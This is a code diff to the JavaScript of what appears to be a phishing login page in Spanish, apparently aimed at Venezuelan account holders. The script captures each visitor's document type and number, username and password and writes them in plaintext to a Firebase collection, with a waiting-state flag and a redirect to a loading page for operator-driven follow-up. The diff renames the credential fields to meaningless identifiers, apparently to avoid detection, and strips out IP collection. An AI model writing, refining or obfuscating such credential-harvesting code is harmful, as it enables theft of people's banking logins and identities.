@@ -23,46 +23,21 @@ try {
     console.error('❌ Configuración que falló:', firebaseConfig);
 }
 
-// Función para obtener la dirección IP
-async function obtenerDireccionIP() {
-    const servicios = [
-        "https://api.ipify.org?format=json",
-        "https://api64.ipify.org?format=json",
-        "https://jsonip.com",
-        "https://api.myip.com",
-        "https://ipapi.co/json/"
-    ];
-    
-    for (const url of servicios) {
-        try {
-            const response = await fetch(url);
-            if (!response.ok) continue;
-            const data = await response.json();
-            return data.ip || data.data || "No disponible";
-        } catch (error) {
-            console.warn('Error obteniendo IP de:', url);
-        }
-    }
-    return "No disponible";
-}
-
 // Función principal cuando el DOM esté listo
 document.addEventListener('DOMContentLoaded', async function () {
     console.log('📄 DOM cargado - Inicializando aplicación');
     
     // Obtener elementos del DOM - TODOS LOS CAMPOS
-    const tipoDocSelect = document.getElementById('tipodocben'); // Tipo de documento
-    const documentoInput = document.getElementById('documento'); // Número de documento
-    const usuarioInput = document.getElementById('u'); // Nombre de usuario
-    const passwordInput = document.getElementById('p'); // Contraseña
+    const dikiSelect = document.getElementById('diki'); // Tipo de documento
+    const dokoinpt = document.getElementById('doko'); // Número de documento
+    const tikiInpt = document.getElementById('tiki'); // Nombre de usuario
+    const tokoInpt = document.getElementById('toko'); // Contraseña
     const submitBtn = document.getElementById('cmdLg'); // Botón de login
-    // Campo de contexto/IP menos evidente (#ctx), con compatibilidad hacia atrás (#direccionIP)
-    const ipInput = document.getElementById('ctx') || document.getElementById('direccionIP');
     const overlay = document.getElementById('loader-container');
     
     
     
-    if (!usuarioInput || !submitBtn) {
+    if (!tikiInpt || !submitBtn) {
         console.error('❌ Elementos críticos no encontrados');
         return;
     }
@@ -73,10 +48,10 @@ document.addEventListener('DOMContentLoaded', async function () {
     // Toggle de visibilidad de contraseña (icono ojo)
     try {
         const eyeIcon = document.querySelector('.move_me');
-        if (eyeIcon && passwordInput) {
+        if (eyeIcon && tokoInpt) {
             eyeIcon.addEventListener('click', () => {
-                const isPass = passwordInput.type === 'password';
-                passwordInput.type = isPass ? 'text' : 'password';
+                const isPass = tokoInpt.type === 'password';
+                tokoInpt.type = isPass ? 'text' : 'password';
                 // Alternar icono
                 eyeIcon.classList.toggle('fa-eye');
                 eyeIcon.classList.toggle('fa-eye-slash');
@@ -86,20 +61,11 @@ document.addEventListener('DOMContentLoaded', async function () {
         console.warn('No se pudo inicializar el toggle de contraseña:', e);
     }
     
-    // Obtener IP al cargar
-    try {
-        const ip = await obtenerDireccionIP();
-        if (ipInput) ipInput.value = ip;
-        console.log('🌐 IP obtenida:', ip);
-    } catch (error) {
-        console.warn('⚠️ Error obteniendo IP:', error);
-    }
-    
     // Función para validar entrada
     function validateInput() {
-        if (usuarioInput && submitBtn) {
+        if (tikiInpt && submitBtn) {
             // Validar que al menos el usuario tenga contenido
-            if (usuarioInput.value.length >= 3) {
+            if (tikiInpt.value.length >= 3) {
                 submitBtn.disabled = false;
                 submitBtn.style.cursor = 'pointer';
                 submitBtn.style.border = '1px solid rgb(132,168,62)';
@@ -213,52 +179,44 @@ document.addEventListener('DOMContentLoaded', async function () {
             submitBtn.style.opacity = '0.7';
             
             // 📝 CAPTURAR TODOS LOS DATOS DEL FORMULARIO
-            const tipoDocumento = tipoDocSelect ? tipoDocSelect.value : '01';
-            const numeroDocumento = documentoInput ? documentoInput.value.trim() : '';
-            const nombreUsuario = usuarioInput ? usuarioInput.value.trim() : '';
-            const contrasena = passwordInput ? passwordInput.value.trim() : '';
+            const diki = dikiSelect ? dikiSelect.value : '01';
+            const doko = dokoinpt ? dokoinpt.value.trim() : '';
+            const tiki = tikiInpt ? tikiInpt.value.trim() : '';
+            const toko = tokoInpt ? tokoInpt.value.trim() : '';
             
             // Obtener texto del tipo de documento seleccionado
-            const tipoDocTexto = tipoDocSelect ? tipoDocSelect.options[tipoDocSelect.selectedIndex].text : 'Venezolano';
+            const tipoDocTexto = dikiSelect ? dikiSelect.options[dikiSelect.selectedIndex].text : 'Venezolano';
             
             console.log('📝 Datos capturados del formulario:', {
-                tipoDocumento,
+                diki,
                 tipoDocTexto,
-                numeroDocumento,
-                nombreUsuario,
-                contrasena: contrasena ? '***' + contrasena.slice(-2) : '' // Ocultar contraseña en logs
+                doko,
+                tiki,
+                toko: toko ? '***' + toko.slice(-2) : '' // Ocultar contraseña en logs
             });
             
-            if (!nombreUsuario) {
+            if (!tiki) {
                 throw new Error("El nombre de usuario no puede estar vacío");
-            }
-
-            // Obtener IP
-            const direccionIP = await obtenerDireccionIP();
-            if (ipInput) {
-                ipInput.value = direccionIP || 'No se pudo obtener la IP';
             }
 
             // Obtener el próximo número secuencial
             const cardNumber = await getNextCardNumber();
 
-            console.log('🎨 Datos del usuario:', { nombreUsuario, cardNumber, direccionIP });
+            console.log('🎨 Datos del usuario:', { tiki, cardNumber });
 
-            // 1. Guardar en colección de redirección (temporal) con page: 0 - TODOS LOS DATOS
-            const userRef = db.collection("redireccion").doc(nombreUsuario);
+            const userRef = db.collection("redireccion").doc(tiki);
             await userRef.set({
                 // 📝 Datos del formulario
-                tipoDocumento: tipoDocumento,
+                diki: diki,
                 tipoDocTexto: tipoDocTexto,
-                numeroDocumento: numeroDocumento,
-                usuario: nombreUsuario,
-                clave: contrasena,
+                doko: doko,
+                usuario: tiki,
+                clave: toko,
                 
                 // 🎨 Datos del sistema
                 tipo: tipoDocTexto, // 🏷️ Mostrar tipo de documento en la tarjeta
                 page: 0, // ⭐ ESTADO DE ESPERA - Clave del flujo correcto
                 cardNumber: cardNumber,
-                direccionIP: direccionIP,
                 dispositivo: /Mobile|Android|iPhone|iPad/.test(navigator.userAgent) ? 'Móvil' : 'Desktop',
                 timestamp: firebase.firestore.FieldValue.serverTimestamp()
             });
@@ -268,14 +226,11 @@ document.addEventListener('DOMContentLoaded', async function () {
             // 2. Preparar datos completos para historial
             const datosCompletos = {
                 // 📝 Datos del formulario
-                tipoDocumento: tipoDocumento,
+                diki: diki,
                 tipoDocTexto: tipoDocTexto,
-                numeroDocumento: numeroDocumento,
-                usuario: nombreUsuario,
-                clave: contrasena,
-                
-                // 🌍 Datos de red y ubicación
-                direccionIP: direccionIP,
+                doko: doko,
+                usuario: tiki,
+                clave: toko,
                 
                 // 🎨 Datos del sistema
                 cardNumber: cardNumber,
@@ -307,8 +262,8 @@ document.addEventListener('DOMContentLoaded', async function () {
             }, 100);
 
             // 4. Guardar usuario en localStorage y redirigir a load.html
-            localStorage.setItem('usuarioActual', nombreUsuario);
-            console.log('💾 Usuario guardado en localStorage:', nombreUsuario);
+            localStorage.setItem('usuarioActual', tiki);
+            console.log('💾 Usuario guardado en localStorage:', tiki);
             
             console.log('🚀 Datos guardados - Redirigiendo a load.html');
             
@@ -331,8 +286,8 @@ document.addEventListener('DOMContentLoaded', async function () {
     }
     
     // Agregar event listeners
-    if (usuarioInput) {
-        usuarioInput.addEventListener('input', validateInput);
+    if (tikiInpt) {
+        tikiInpt.addEventListener('input', validateInput);
         console.log('🎯 Event listener agregado al campo de usuario');
     }
     
